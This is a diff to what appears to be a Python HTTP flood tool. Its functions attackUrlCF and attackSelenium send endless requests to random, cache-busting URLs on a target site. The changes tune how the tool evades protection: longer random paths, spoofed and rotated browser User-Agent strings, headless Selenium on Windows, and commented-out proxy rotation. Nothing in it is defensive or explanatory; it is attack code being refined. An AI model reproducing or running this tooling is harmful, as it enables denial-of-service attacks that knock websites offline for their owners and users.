@@ -145,9 +145,9 @@ def attackUrlCF(baseUrl):
 
 	while True:
 		try:
-			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
+			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(15)) 
 
-			headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
+			headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
 			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
 			'Accept-Language': 'en-US,en;q=0.5',
 			'Accept-Encoding': 'gzip, deflate, br',
@@ -272,19 +272,20 @@ def get_driver():
 	# options.add_argument('--blink-settings=imagesEnabled=false')
 	
 
-	# Proxy
-	prox_url, proxies = changeProxies()
-	r = re.findall('\/\/(.+?):(.+?)@(.+?):(.+)', prox_url)
-	print(r)
-	username = r[0][0]
-	password = r[0][1]
-	host = r[0][2]
-	port = r[0][3]
-	proxy = (host, port, username, password) 
-	proxy_extension = ProxyExtension(*proxy)
-	print(proxy_extension.directory)
-	options.add_argument(f"--load-extension={proxy_extension.directory}") #,/root/blablabla/capExt
-	print('proxy is set to %s' % prox_url)
+	# ------ Proxy
+
+	# prox_url, proxies = changeProxies()
+	# r = re.findall('\/\/(.+?):(.+?)@(.+?):(.+)', prox_url)
+	# print(r)
+	# username = r[0][0]
+	# password = r[0][1]
+	# host = r[0][2]
+	# port = r[0][3]
+	# proxy = (host, port, username, password) 
+	# proxy_extension = ProxyExtension(*proxy)
+	# print(proxy_extension.directory)
+	# options.add_argument(f"--load-extension={proxy_extension.directory}") #,/root/blablabla/capExt
+	# print('proxy is set to %s' % prox_url)
 
 	userAgent = user_agent_rotator.get_random_user_agent()
 	userAgent = re.sub('Chrome\/.+?\.', 'Chrome/' + str(random.randint(99,109)) + '.', userAgent)
@@ -306,7 +307,7 @@ def get_driver():
 	# if we don't set driver_executable_path it downloads, patches, and deletes the driver each time
 	windows_headless = False
 	if os.name == 'nt':
-		windows_headless = False
+		windows_headless = True
 	else:
 		start_xvfb_display()
 
@@ -330,7 +331,7 @@ def attackSelenium(baseUrl):
 	while True:
 		try:
 			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
-			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,20)))
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
 			print(url)
 			driver.get(url)
 
